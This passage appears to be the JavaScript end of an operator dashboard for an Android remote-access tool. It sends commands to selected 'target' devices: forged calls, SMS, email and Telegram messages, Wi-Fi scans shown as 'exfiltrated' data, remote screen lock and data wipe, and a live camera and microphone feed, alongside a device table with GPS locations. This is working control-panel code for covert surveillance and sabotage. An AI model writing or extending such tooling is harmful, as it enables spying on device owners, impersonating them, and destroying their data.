            if (markers[firstId]) markers[firstId].openPopup();
            if (activeRadarCircle) map.removeLayer(activeRadarCircle);
            activeRadarCircle = L.circleMarker([lat, lon], { radius: 40, className: 'radar-pulse-circle' }).addTo(map);
            setTimeout(() => { if(activeRadarCircle) map.removeLayer(activeRadarCircle); }, 6000);
        }
    }
});

// 3. TTS Box
document.getElementById('btnTTS').addEventListener('click', () => {
    if (selectedIds.size === 0) return showToast('No device selected', 'error');
    let html = `
        <label class="info-label">CHAÎNE TEXTE À SYNTHÉTISER :</label>
        <input type="text" id="ttsText" class="modal-input" placeholder="Ex: Alerte intrusion" autocomplete="off">
        <div class="modal-btn-row"><button class="cmd-btn" id="modalSendTTS" style="color:var(--accent);border-color:var(--accent)">TRANSMETTRE</button></div>`;
    openTacticalModal("🔊 TEXT TO SPEECH INJECTION", html);
    document.getElementById('modalSendTTS').onclick = async () => {
        const val = document.getElementById('ttsText').value.trim();
        if(val) { await sendCommand('TEXT2SPEACH', val); closeTacticalModal(); }
    };
});

// 4. Morse Box
document.getElementById('btnMorse').addEventListener('click', () => {
    if (selectedIds.size === 0) return showToast('No device selected', 'error');
    let html = `
        <label class="info-label">MESSAGE EN CODE MORSE :</label>
        <input type="text" id="morseText" class="modal-input" placeholder="SOS" style="text-transform:uppercase;">
        <div class="modal-btn-row"><button class="cmd-btn" id="modalSendMorse">EXECUTE</button></div>`;
    openTacticalModal("·−·− MORSE TRANSMITTER", html);
    document.getElementById('modalSendMorse').onclick = async () => {
        const val = document.getElementById('morseText').value.trim();
        if(val) { await sendCommand('MORSE', val); closeTacticalModal(); }
    };
});

// 5. Audio Track Deck
document.getElementById('btnAudio').addEventListener('click', () => {
    if (selectedIds.size === 0) return showToast('No device selected', 'error');
    let html = `
        <label class="info-label">IDENTIFIANT PISTE SONORE :</label>
        <input type="text" id="audioTrack" class="modal-input" value="alert_siren.mp3">
        <div class="modal-btn-row"><button class="cmd-btn" id="modalSendAudio" style="color:var(--accent2);border-color:var(--accent2)">PLAY TRACK</button></div>`;
    openTacticalModal("🎵 OUTBOUND AUDIO DECK", html);
    document.getElementById('modalSendAudio').onclick = async () => {
        const val = document.getElementById('audioTrack').value.trim();
        if(val) { await sendCommand('PLAYAUDIO', val); closeTacticalModal(); }
    };
});

// 6. Full Glow Hex + Picker
document.getElementById('btnFullGlow').addEventListener('click', () => {
    if (selectedIds.size === 0) return showToast('No device selected', 'error');
    let html = `
        <div class="color-swatches">
            <div class="swatch white" onclick="document.getElementById('glowPicker').value='#ffffff';"></div><span>Blanc</span>
            <div class="swatch red" onclick="document.getElementById('glowPicker').value='#ff4757';"></div><span>Rouge Ops</span>
        </div>
        <div class="picker-wrapper">
            <label class="info-label">PICKER DIRECT :</label>
            <input type="color" id="glowPicker" class="custom-color-picker" value="#00d4aa">
        </div>
        <div class="modal-btn-row"><button class="cmd-btn" id="modalSendGlow">APPLIQUER LE GLOW</button></div>`;
    openTacticalModal("🖥️ FULL GLOW CONTROLLER", html);
    document.getElementById('modalSendGlow').onclick = async () => {
        await sendCommand('FULL_GLOW', document.getElementById('glowPicker').value);
        closeTacticalModal();
    };
});

// 7. Wifi Scan Rapport Mock
document.getElementById('btnWifiScan').addEventListener('click', async () => {
    if (selectedIds.size === 0) return;
    showToast('Analyse spectrale WiFi lancée...', 'success');
    const ok = await sendCommand('WIFI_SCAN');
    if (!ok) return;
    setTimeout(() => {
        let html = `
            <table style="width:100%;font-size:11px;font-family:'JetBrains Mono',monospace;">
                <thead><tr><th>ESSID</th><th>SIGNAL</th></tr></thead>
                <tbody>
                    <tr><td>📡 TAC-OPERATIONS-SECURE</td><td style="color:var(--accent)">-39 dBm</td></tr>
                    <tr><td>📡 NSA-DUMP-GUEST</td><td style="color:var(--accent2)">-62 dBm</td></tr>
                </tbody>
            </table>`;
        openTacticalModal("📶 EXFILTRATED NETWORK DATA", html);
    }, 1200);
});

// 8. Comms Overlord Injections
function registerCommTrigger(id, cmdName, placeholder, label) {
    document.getElementById(id).addEventListener('click', () => {
        if (selectedIds.size === 0) return showToast('No device selected', 'error');
        let html = `
            <label class="info-label">${label} :</label>
            <input type="text" id="commTarget" class="modal-input" placeholder="${placeholder}">
            <label class="info-label">CORPS / PAYLOAD TEXTE :</label>
            <input type="text" id="commBody" class="modal-input" placeholder="Message...">
            <div class="modal-btn-row"><button class="cmd-btn" id="modalSendComm">INJECTER</button></div>`;
        openTacticalModal(`💬 INJECT ${cmdName}`, html);
        document.getElementById('modalSendComm').onclick = async () => {
            const target = document.getElementById('commTarget').value.trim();
            const body = document.getElementById('commBody').value.trim();
            if(target) { 
                if (cmdName === 'INJECT_CALL' || cmdName === 'INJECT_SMS' || cmdName === 'INJECT_MAIL' || cmdName === 'INJECT_TELEGRAM') {
                    // FIX: séparateur ">" aligné avec le parser Android
                    let packagePayload = target + ">" + body;
                    await sendCommand(cmdName, packagePayload); 
                } else {
                    await sendCommand(cmdName, target); 
                }
                closeTacticalModal(); 
            }
        };
    });
}
registerCommTrigger('btnCommCall', 'INJECT_CALL', '+33611223344', 'NUMÉRO CIBLE');
registerCommTrigger('btnCommSMS', 'INJECT_SMS', '+33611223344', 'NUMÉRO SMS');
registerCommTrigger('btnCommMail', 'INJECT_MAIL', 'target@stratosphere.io', 'EMAIL');
registerCommTrigger('btnCommTelegram', 'INJECT_TELEGRAM', '@chat_id', 'TELEGRAM CHAT');

// Toggles standard
document.querySelectorAll('.cmd-btn[data-toggle]').forEach(btn => {
    btn.addEventListener('click', async () => {
        if (btn.id === 'btnLive') {
            if (activeToggles['btnLive']) { closeMatrixWindow(); }
            else {
                if (selectedIds.size === 0) return showToast('Select targets first', 'error');
                const ok = await sendCommand('LIVE');
                if (ok) { btn.classList.add('active'); activeToggles['btnLive'] = true; openMatrixWindow(); }
            }
            return;
        }
        const on = btn.dataset.on;
        const off = btn.dataset.off;
        const cmd = activeToggles[btn.id] ? off : on;
        const ok = await sendCommand(cmd);
        if (!ok) return;
        if (activeToggles[btn.id]) { btn.classList.remove('active'); delete activeToggles[btn.id]; }
        else { btn.classList.add('active'); activeToggles[btn.id] = true; }
    });
});

const oneShot = { btnScreenLock: 'SCREEN_LOCK', btnWipeData: 'WIPE_DATA' };
Object.entries(oneShot).forEach(([id, cmd]) => {
    document.getElementById(id)?.addEventListener('click', () => {
        if (id === 'btnWipeData') {
            if(confirm("🚨 CONFIRMER LE SÉQUESTRE ET LA DESTRUCTION GLOBALE DES ASSETS ?")) sendCommand(cmd);
        } else { sendCommand(cmd); }
    });
});

function openMatrixWindow() {
    const win = document.getElementById('floatingMatrixWindow');
    win.style.display = 'flex'; win.style.height = '640px';
    const grid = document.getElementById('matrixGrid');
    grid.innerHTML = "";
    const targetsArray = [...selectedIds];
    if (targetsArray.length === 0) return;
    const targetsDetails = targetsArray.map(id => {
        const tr = document.querySelector(`#devicesBody tr[data-id="${id}"]`);
        let brand = tr ? tr.dataset.brand : 'Appareil';
        let model = tr ? tr.dataset.model : id;
        return `${id}*${brand.replace(/\s+/g, '-')}-${model.replace(/\s+/g, '-')}`;
    });
    grid.innerHTML = `<div class="single-iframe-box"><iframe src="https://192.168.1.107:8443/viewer3.html?targets=${encodeURIComponent(targetsDetails.join(','))}" allow="autoplay; camera; microphone;" allowfullscreen></iframe></div>`;
}

function minimizeMatrixWindow() {
    const win = document.getElementById('floatingMatrixWindow');
    win.style.height = (win.style.height === '45px') ? '640px' : '45px';
}

function closeMatrixWindow() {
    sendCommand('STOPLIVE');
    document.getElementById('floatingMatrixWindow').style.display = 'none';
    document.getElementById('btnLive').classList.remove('active');
    delete activeToggles['btnLive'];
}

const floatWin = document.getElementById('floatingMatrixWindow');
const floatHeader = document.getElementById('matrixHeader');
let px=0, py=0, cx=0, cy=0;
floatHeader.onmousedown = (e) => {
    e.preventDefault(); cx=e.clientX; cy=e.clientY;
    document.onmouseup = () => { document.onmouseup=null; document.onmousemove=null; };
    document.onmousemove = (e) => {
        e.preventDefault(); px=cx-e.clientX; py=cy-e.clientY; cx=e.clientX; cy=e.clientY;
        floatWin.style.top=(floatWin.offsetTop-py)+"px"; floatWin.style.left=(floatWin.offsetLeft-px)+"px";
        floatWin.style.bottom="auto"; floatWin.style.right="auto";
    };
};

async function refreshDevices() {
    const badge = document.getElementById('refreshBadge');
    if (badge) badge.style.display = 'inline-block';
    try {
        const res = await fetch('devices_list.php', { headers: { 'X-CSRF-Token': CSRF, 'X-Requested-With': 'XMLHttpRequest' }});
        const json = await res.json();
        if (json.success && Array.isArray(json.devices)) rebuildTable(json.devices);
    } catch (_) {}
    finally { setTimeout(() => { if (badge) badge.style.display='none'; }, 800); }
}

function rebuildTable(devices) {
    const tbody = document.getElementById('devicesBody');
    if (!tbody) return;
    const checks = {};
    document.querySelectorAll('.devCb:checked:not(#selectAll)').forEach(cb => { checks[cb.value]=true; });
    tbody.innerHTML = '';
    window.globalDevicesMap = {};
    devices.forEach(d => {
        const online = d.online;
        const bat = parseInt(d.battery) || 0;
        const batColor = bat > 50 ? 'var(--accent)' : (bat > 20 ? 'var(--warn)' : 'var(--danger)');
        const tr = document.createElement('tr');
        tr.dataset.id=d.id; tr.dataset.lat=d.lat; tr.dataset.lon=d.lon;
        tr.dataset.brand=d.brand; tr.dataset.model=d.model;
        window.globalDevicesMap[d.id] = { brand: d.brand, model: d.model };
        tr.innerHTML = `
            <td><input type="checkbox" class="devCb" value="${d.id}" ${checks[d.id]?'checked':''}></td>
            <td style="font-family:'JetBrains Mono',monospace;color:var(--accent2);font-weight:700;">#${d.id}</td>
            <td>${escHtml(d.brand)}</td><td>${escHtml(d.model)}</td><td>${escHtml(d.os)}</td><td>${escHtml(d.connect)}</td>
            <td><div class="battery-bar"><div class="battery-fill" style="width:${bat}%;background:${batColor}"></div></div><span>${bat}%</span></td>
            <td><span class="${online?'badge-online':'badge-offline'}">${online?'LIVE':'OFF'}</span></td>`;
        tbody.appendChild(tr);
    });
    updateSelection();
    updateStats();
}

function escHtml(str) {
    return String(str ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
setInterval(refreshDevices, 30000);
</script>
</body>
</html>
